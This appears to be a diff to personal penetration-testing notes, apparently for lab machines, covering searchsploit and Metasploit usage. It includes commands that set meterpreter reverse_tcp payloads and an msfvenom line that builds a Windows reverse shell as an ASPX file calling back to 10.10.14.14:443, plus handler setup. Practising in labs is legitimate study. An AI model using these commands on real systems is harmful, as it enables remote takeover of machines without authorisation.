@@ -1,3 +1,19 @@
+searchsploit <CMS Name/Package>
+searchsploit -m <exploit> (to get the exact path of the exploit in kali machine)
+
+metsaploit note:  
+
+search exploit in msfconsole:
+search <Software Name>
+
+Always run "check" command before running any exploit.
+
+Try with both x86 and x64 payloads:
+
+set payload linux/x64/meterpreter/reverse_tcp
+set payload linux/x86/meterpreter/reverse_tcp
+
+*************************************************************************************************************************
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.14 LPORT=443 -f aspx > met_rev_443.aspx
 use exploit/multi/handler
 set payload windows/meterpreter/reverse_tcp
